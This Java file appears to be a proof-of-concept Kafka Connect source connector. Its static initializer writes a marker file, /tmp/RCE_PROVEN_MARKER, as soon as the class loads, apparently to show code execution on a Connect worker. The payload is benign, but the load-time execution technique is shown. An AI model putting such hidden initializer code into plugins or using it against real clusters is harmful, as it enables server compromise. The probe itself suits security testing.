import org.apache.kafka.common.config.ConfigDef;
import org.apache.kafka.connect.connector.Task;
import org.apache.kafka.connect.source.SourceConnector;
import java.nio.file.*;
import java.util.*;

public class ProbeConnector extends SourceConnector {
    static {
        try {
            Files.write(Paths.get("/tmp/RCE_PROVEN_MARKER"),
                ("static-initializer-fired at " + System.currentTimeMillis() + "\n").getBytes());
        } catch (Exception ignored) {}
    }
    @Override public String version() { return "1.0"; }
    @Override public void start(Map<String, String> props) {}
    @Override public Class<? extends Task> taskClass() { return ProbeTask.class; }
    @Override public List<Map<String, String>> taskConfigs(int maxTasks) { return List.of(); }
    @Override public void stop() {}
    @Override public ConfigDef config() { return new ConfigDef(); }

    public static class ProbeTask extends org.apache.kafka.connect.source.SourceTask {
        @Override public String version() { return "1.0"; }
        @Override public void start(Map<String, String> props) {}
        @Override public List<org.apache.kafka.connect.source.SourceRecord> poll() { return null; }
        @Override public void stop() {}
    }
}
